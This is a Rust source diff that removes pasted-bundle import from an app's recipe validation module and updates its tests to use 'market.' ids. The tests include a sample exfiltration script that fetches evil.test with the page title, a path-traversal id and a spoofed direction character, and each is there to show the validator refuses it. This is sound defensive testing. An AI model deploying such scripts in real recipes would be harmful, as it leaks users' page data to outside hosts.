@@ -1,23 +1,22 @@
-//! Recipes that come from outside the app: pasted bundles and the bundled library. Everything
-//! in them is the sender's claim, so the sender's `origin` and id prefix are
-//! replaced before validation, and the text that the review screen will show is checked for
-//! characters that could disguise it.
+//! Recipes that come from outside the app: the bundled library and recipes about to be shared.
+//! Everything in them is the author's claim, so the claimed `origin` is replaced before
+//! validation, and the text that the review screen will show is checked for characters that
+//! could disguise it.
 
-use std::collections::{BTreeMap, HashSet};
+use std::collections::BTreeMap;
 
-use serde::{Deserialize, Serialize};
+use serde::Serialize;
 use url::Url;
 
 use super::matcher::Matcher;
 use super::schema::{Origin, Recipe, Rule};
 use crate::error::{Error, Result};
 
+/// Recipes installed by earlier versions that accepted pasted bundles are saved under this prefix.
+/// They are still loaded and can be removed, but nothing creates new ones.
 pub const IMPORTED_PREFIX: &str = "imported.";
 pub const MARKET_PREFIX: &str = "market.";
 
-const BUNDLE_FORMAT: u32 = 1;
-const MAX_BUNDLE_BYTES: usize = 1024 * 1024;
-const MAX_BUNDLE_RECIPES: usize = 20;
 pub const MAX_RECIPE_BYTES: usize = 256 * 1024;
 const MAX_ID_CHARS: usize = 80;
 const MAX_NAME_CHARS: usize = 60;
@@ -32,24 +31,15 @@ const MAX_MATCH_PATTERNS: usize = 20;
 /// Where a recipe came from. It decides how the id is treated.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Source {
-    /// A pasted bundle: the id is moved under `imported.` so it can never replace another
-    /// recipe, such as an installed library one.
-    File,
     /// A recipe of the bundled library (official or community), or one about to be shared: the id
     /// must be `market.` and is kept.
     Bundled,
-    /// One of our own saved files: the id must already be under `imported.` or `market.`.
+    /// One of our own saved files: the id must already be under `imported.` (written by an
+    /// earlier version) or `market.`.
     Stored,
 }
 
-#[derive(Serialize, Deserialize)]
-#[serde(deny_unknown_fields, rename_all = "camelCase")]
-struct Bundle<T> {
-    openmedia_bundle: u32,
-    recipes: Vec<T>,
-}
-
-/// What the review screen shows before anything is saved.
+/// What the review screen shows before a library recipe is installed.
 #[derive(Debug, Clone, PartialEq, Serialize)]
 #[serde(rename_all = "camelCase")]
 pub struct RecipePreview {
@@ -96,49 +86,6 @@ pub struct RulePreview {
     pub code: Option<String>,
 }
 
-pub fn export_bundle(recipes: &[Recipe]) -> Result<String> {
-    let bundle = Bundle {
-        openmedia_bundle: BUNDLE_FORMAT,
-        recipes: recipes.to_vec(),
-    };
-    Ok(serde_json::to_string_pretty(&bundle)?)
-}
-
-pub fn parse_bundle(text: &str) -> Result<Vec<Recipe>> {
-    if text.len() > MAX_BUNDLE_BYTES {
-        return Err(Error::Recipe("the bundle is too large".into()));
-    }
-    let bundle: Bundle<serde_json::Value> =
-        serde_json::from_str(text).map_err(|e| Error::Recipe(e.to_string()))?;
-    if bundle.openmedia_bundle != BUNDLE_FORMAT {
-        return Err(Error::Recipe(format!(
-            "unsupported bundle format {}",
-            bundle.openmedia_bundle
-        )));
-    }
-    if bundle.recipes.is_empty() || bundle.recipes.len() > MAX_BUNDLE_RECIPES {
-        return Err(Error::Recipe(format!(
-            "a bundle holds 1 to {MAX_BUNDLE_RECIPES} recipes"
-        )));
-    }
-    let recipes = bundle
-        .recipes
-        .into_iter()
-        .map(|value| parse_value(value, Source::File))
-        .collect::<Result<Vec<_>>>()?;
-    let mut seen = HashSet::new();
-    if let Some(duplicate) = recipes
-        .iter()
-        .find(|recipe| !seen.insert(recipe.id.as_str()))
-    {
-        return Err(Error::Recipe(format!(
-            "the bundle has two recipes with id {}",
-            duplicate.id
-        )));
-    }
-    Ok(recipes)
-}
-
 pub fn parse_shared(json: &[u8], source: Source) -> Result<Recipe> {
     if json.len() > MAX_RECIPE_BYTES {
         return Err(Error::Recipe("the recipe is too large".into()));
@@ -163,8 +110,6 @@ fn parse_value(value: serde_json::Value, source: Source) -> Result<Recipe> {
 fn shared_id(source: Source, id: &str) -> Result<String> {
     let has_prefix = id.starts_with(IMPORTED_PREFIX) || id.starts_with(MARKET_PREFIX);
     let id = match source {
-        Source::File if id.starts_with(IMPORTED_PREFIX) => id.to_owned(),
-        Source::File => format!("{IMPORTED_PREFIX}{id}"),
         Source::Bundled if id.starts_with(MARKET_PREFIX) => id.to_owned(),
         Source::Stored if has_prefix => id.to_owned(),
         Source::Bundled | Source::Stored => {
@@ -399,19 +344,12 @@ mod tests {
         )
     }
 
-    fn bundle_of(recipes: &[String]) -> String {
-        format!(
-            r#"{{"openmediaBundle": 1, "recipes": [{}]}}"#,
-            recipes.join(",")
-        )
-    }
-
     fn file(json: &str) -> Result<Recipe> {
-        parse_shared(json.as_bytes(), Source::File)
+        parse_shared(json.as_bytes(), Source::Bundled)
     }
 
     fn hub_of(tabs: &str) -> String {
-        recipe_json("hub", &format!(r#", "hub": {{"tabs": [{tabs}]}}"#)).replace(
+        recipe_json("market.hub", &format!(r#", "hub": {{"tabs": [{tabs}]}}"#)).replace(
             "https://*.example.com/*",
             "https://www.example.com/inbox/*\", \"https://chat.example.org/*",
         )
@@ -427,7 +365,7 @@ mod tests {
         assert_eq!(tabs.len(), 2);
         assert_eq!(tabs[1].host, "chat.example.org");
         assert!(
-            preview(&file(&recipe_json("calm", "")).unwrap(), None)
+            preview(&file(&recipe_json("market.calm", "")).unwrap(), None)
                 .tabs
                 .is_empty()
         );
@@ -463,22 +401,17 @@ mod tests {
 
     #[test]
     fn a_file_cannot_use_a_broad_match_and_cannot_claim_a_removed_origin() {
-        let broad = recipe_json("calm", "").replace("https://*.example.com/*", "https://*/*");
+        let broad =
+            recipe_json("market.calm", "").replace("https://*.example.com/*", "https://*/*");
         assert!(file(&broad).is_err());
-        let bundled = recipe_json("calm", "").replace("\"user\"", "\"bundled\"");
+        let bundled = recipe_json("market.calm", "").replace("\"user\"", "\"bundled\"");
         assert!(file(&bundled).is_err());
     }
 
     #[test]
-    fn a_file_is_always_imported_whatever_origin_it_claims() {
-        let json = recipe_json("calm", "").replace("\"user\"", "\"ai\"");
-        assert_eq!(file(&json).unwrap().origin, Origin::Imported);
-    }
-
-    #[test]
-    fn an_import_needs_valid_platform_tags() {
-        assert!(file(&recipe_json("calm", "")).is_ok());
-        let without = recipe_json("calm", "").replace("\"tags\": [\"mobile\"],", "");
+    fn a_recipe_needs_valid_platform_tags() {
+        assert!(file(&recipe_json("market.calm", "")).is_ok());
+        let without = recipe_json("market.calm", "").replace("\"tags\": [\"mobile\"],", "");
         assert!(file(&without).is_err());
         for bad in [
             "[]",
@@ -488,27 +421,22 @@ mod tests {
             "[\"tv\"]",
             "[\"mobile\", \"desktop\", \"desktop\"]",
         ] {
-            let json = recipe_json("calm", "").replace("[\"mobile\"],", &format!("{bad},"));
+            let json = recipe_json("market.calm", "").replace("[\"mobile\"],", &format!("{bad},"));
             assert!(file(&json).is_err(), "{bad}");
         }
-        let both = recipe_json("calm", "").replace("[\"mobile\"],", "[\"desktop\", \"mobile\"],");
+        let both =
+            recipe_json("market.calm", "").replace("[\"mobile\"],", "[\"desktop\", \"mobile\"],");
         assert_eq!(file(&both).unwrap().tags, ["desktop", "mobile"]);
     }
 
     #[test]
-    fn a_file_id_is_moved_under_imported_so_it_cannot_replace_an_installed_recipe() {
+    fn a_stored_file_may_keep_an_imported_id_from_an_earlier_version() {
+        let json = recipe_json("imported.calm", "");
         assert_eq!(
-            file(&recipe_json("instagram.default", "")).unwrap().id,
-            "imported.instagram.default"
-        );
-        assert_eq!(
-            file(&recipe_json("market.calm", "")).unwrap().id,
-            "imported.market.calm"
-        );
-        assert_eq!(
-            file(&recipe_json("imported.calm", "")).unwrap().id,
+            parse_shared(json.as_bytes(), Source::Stored).unwrap().id,
             "imported.calm"
         );
+        assert!(parse_shared(json.as_bytes(), Source::Bundled).is_err());
     }
 
     #[test]
@@ -524,97 +452,78 @@ mod tests {
 
     #[test]
     fn ids_that_could_leave_the_recipes_folder_or_overflow_are_refused() {
-        assert!(file(&recipe_json("../escape", "")).is_err());
-        assert!(file(&recipe_json("a/b", "")).is_err());
-        assert!(file(&recipe_json("Upper", "")).is_err());
-        assert!(file(&recipe_json(&"x".repeat(100), "")).is_err());
+        assert!(file(&recipe_json("market../escape", "")).is_err());
+        assert!(file(&recipe_json("market.a/b", "")).is_err());
+        assert!(file(&recipe_json("market.Upper", "")).is_err());
+        assert!(file(&recipe_json(&format!("market.{}", "x".repeat(100)), "")).is_err());
     }
 
     #[test]
     fn invisible_direction_overrides_and_control_characters_are_refused() {
-        let spoofed = recipe_json("calm", "").replace("Calm", "Ca\u{202E}lm");
+        let spoofed = recipe_json("market.calm", "").replace("Calm", "Ca\u{202E}lm");
         assert!(file(&spoofed).is_err());
-        let control = recipe_json("calm", "").replace("The shorts shelf.", "line\\u0007bell");
+        let control =
+            recipe_json("market.calm", "").replace("The shorts shelf.", "line\\u0007bell");
         assert!(file(&control).is_err());
     }
 
     #[test]
     fn a_homepage_the_recipe_does_not_cover_is_refused() {
         let outside = r#", "meta": {"homepage": "https://evil.test/"}"#;
-        assert!(file(&recipe_json("calm", outside)).is_err());
+        assert!(file(&recipe_json("market.calm", outside)).is_err());
         let inside = r#", "meta": {"homepage": "https://www.example.com/"}"#;
-        assert!(file(&recipe_json("calm", inside)).is_ok());
+        assert!(file(&recipe_json("market.calm", inside)).is_ok());
     }
 
     #[test]
     fn notes_may_break_lines_but_other_text_may_not() {
         let meta = |key: &str, value: &str| format!(r#", "meta": {{"{key}": "{value}"}}"#);
-        assert!(file(&recipe_json("calm", &meta("notes", r"- one\n- two"))).is_ok());
-        assert!(file(&recipe_json("calm", &meta("notes", r"one\r\ntwo"))).is_err());
-        assert!(file(&recipe_json("calm", &meta("notes", r"one\ttwo"))).is_err());
-        assert!(file(&recipe_json("calm", &meta("author", r"one\ntwo"))).is_err());
+        assert!(file(&recipe_json("market.calm", &meta("notes", r"- one\n- two"))).is_ok());
+        assert!(file(&recipe_json("market.calm", &meta("notes", r"one\r\ntwo"))).is_err());
+        assert!(file(&recipe_json("market.calm", &meta("notes", r"one\ttwo"))).is_err());
+        assert!(file(&recipe_json("market.calm", &meta("author", r"one\ntwo"))).is_err());
     }
 
     #[test]
     fn a_summary_is_one_to_140_plain_characters() {
         let summary = |text: &str| format!(r#", "meta": {{"summary": "{text}"}}"#);
-        assert!(file(&recipe_json("calm", &summary("Hides the shorts shelf."))).is_ok());
-        assert!(file(&recipe_json("calm", &summary(""))).is_err());
-        assert!(file(&recipe_json("calm", &summary("  "))).is_err());
-        assert!(file(&recipe_json("calm", &summary(&"s".repeat(141)))).is_err());
-        assert!(file(&recipe_json("calm", &summary(&"s".repeat(140)))).is_ok());
-        assert!(file(&recipe_json("calm", &summary(r"one\ntwo"))).is_err());
+        assert!(
+            file(&recipe_json(
+                "market.calm",
+                &summary("Hides the shorts shelf.")
+            ))
+            .is_ok()
+        );
+        assert!(file(&recipe_json("market.calm", &summary(""))).is_err());
+        assert!(file(&recipe_json("market.calm", &summary("  "))).is_err());
+        assert!(file(&recipe_json("market.calm", &summary(&"s".repeat(141)))).is_err());
+        assert!(file(&recipe_json("market.calm", &summary(&"s".repeat(140)))).is_ok());
+        assert!(file(&recipe_json("market.calm", &summary(r"one\ntwo"))).is_err());
     }
 
     #[test]
     fn notes_may_be_long_but_not_longer_than_the_cap() {
         let notes = |len: usize| format!(r#", "meta": {{"notes": "{}"}}"#, "n".repeat(len));
-        assert!(file(&recipe_json("calm", &notes(MAX_NOTES_CHARS))).is_ok());
-        assert!(file(&recipe_json("calm", &notes(MAX_NOTES_CHARS + 1))).is_err());
+        assert!(file(&recipe_json("market.calm", &notes(MAX_NOTES_CHARS))).is_ok());
+        assert!(file(&recipe_json("market.calm", &notes(MAX_NOTES_CHARS + 1))).is_err());
     }
 
     #[test]
     fn unknown_fields_are_refused() {
-        assert!(file(&recipe_json("calm", ", \"extra\": 1")).is_err());
+        assert!(file(&recipe_json("market.calm", ", \"extra\": 1")).is_err());
     }
 
     #[test]
     fn a_version_must_be_three_numbers() {
-        assert!(file(&recipe_json("calm", "").replace("1.0.0", "1.0")).is_err());
-        assert!(file(&recipe_json("calm", "").replace("1.0.0", "1.0.0-beta")).is_err());
-    }
-
-    #[test]
-    fn a_bundle_round_trips_and_exports_the_tags() {
-        let recipe = file(&recipe_json("calm", "")).unwrap();
-        let text = export_bundle(std::slice::from_ref(&recipe)).unwrap();
-        assert!(text.contains("\"tags\""));
-        assert_eq!(parse_bundle(&text).unwrap(), vec![recipe]);
-    }
-
-    #[test]
-    fn a_bundle_is_refused_when_malformed_oversized_or_duplicated() {
-        let one = recipe_json("calm", "");
-        assert!(parse_bundle(&bundle_of(&[])).is_err());
-        assert!(parse_bundle(&bundle_of(&[one.clone(), one.clone()])).is_err());
-        let many: Vec<String> = (0..21).map(|n| recipe_json(&format!("r{n}"), "")).collect();
-        assert!(parse_bundle(&bundle_of(&many)).is_err());
-        assert!(
-            parse_bundle(
-                &bundle_of(std::slice::from_ref(&one))
-                    .replace("\"openmediaBundle\": 1", "\"openmediaBundle\": 2")
-            )
-            .is_err()
-        );
-        assert!(parse_bundle(&bundle_of(&[one]).replace("}]}", "}], \"x\": 1}")).is_err());
-        assert!(parse_bundle(&"x".repeat(MAX_BUNDLE_BYTES + 1)).is_err());
+        assert!(file(&recipe_json("market.calm", "").replace("1.0.0", "1.0")).is_err());
+        assert!(file(&recipe_json("market.calm", "").replace("1.0.0", "1.0.0-beta")).is_err());
     }
 
     #[test]
     fn the_preview_lists_every_rule_and_what_it_would_replace() {
-        let recipe = file(&recipe_json("calm", "")).unwrap();
+        let recipe = file(&recipe_json("market.calm", "")).unwrap();
         let preview = preview(&recipe, Some("0.9.0"));
-        assert_eq!(preview.id, "imported.calm");
+        assert_eq!(preview.id, "market.calm");
         assert_eq!(preview.replaces.as_deref(), Some("0.9.0"));
         assert_eq!(preview.rules.len(), 1);
         assert_eq!(preview.rules[0].selector, ".shelf");
@@ -623,7 +532,7 @@ mod tests {
 
     fn script_recipe(code: &str) -> String {
         let code = serde_json::to_string(code).unwrap();
-        recipe_json("calm", "").replace(
+        recipe_json("market.calm", "").replace(
             r#""type": "hide", "option": "shorts",
                             "target": {"css": ".shelf"}"#,
             &format!(r#""type": "script", "option": "shorts", "code": {code}"#),
@@ -634,16 +543,10 @@ mod tests {
     const LEAKY: &str = "fetch('https://evil.test/?c=' + document.title);";
 
     #[test]
-    fn an_imported_script_that_calls_fetch_is_refused_naming_the_finding() {
+    fn a_script_that_calls_fetch_is_refused_naming_the_finding() {
         let text = file(&script_recipe(LEAKY)).unwrap_err().to_string();
         assert!(text.contains("script rule r1 is refused"), "{text}");
         assert!(text.contains("network at line 1"), "{text}");
-    }
-
-    #[test]
-    fn the_bundled_path_enforces_the_policy_too() {
-        let json = script_recipe(LEAKY).replace("\"calm\"", "\"market.calm\"");
-        assert!(parse_shared(json.as_bytes(), Source::Bundled).is_err());
     }
 
     #[test]
@@ -655,20 +558,13 @@ mod tests {
     }
 
     #[test]
-    fn a_clean_script_is_accepted_when_imported_and_previewed_with_its_code() {
+    fn a_clean_script_is_accepted_and_previewed_with_its_code() {
         let recipe = file(&script_recipe(CLEAN)).unwrap();
         let preview = preview(&recipe, None);
         assert!(preview.runs_code);
         assert_eq!(preview.rules[0].kind, "script");
         assert_eq!(preview.rules[0].code.as_deref(), Some(CLEAN));
         assert!(preview.rules[0].selector.is_empty());
-        assert!(!super::preview(&file(&recipe_json("calm", "")).unwrap(), None).runs_code);
-    }
-
-    #[test]
-    fn scripts_round_trip_through_a_bundle_unchanged() {
-        let recipe = file(&script_recipe(CLEAN)).unwrap();
-        let text = export_bundle(std::slice::from_ref(&recipe)).unwrap();
-        assert_eq!(parse_bundle(&text).unwrap(), vec![recipe]);
+        assert!(!super::preview(&file(&recipe_json("market.calm", "")).unwrap(), None).runs_code);
     }
 }
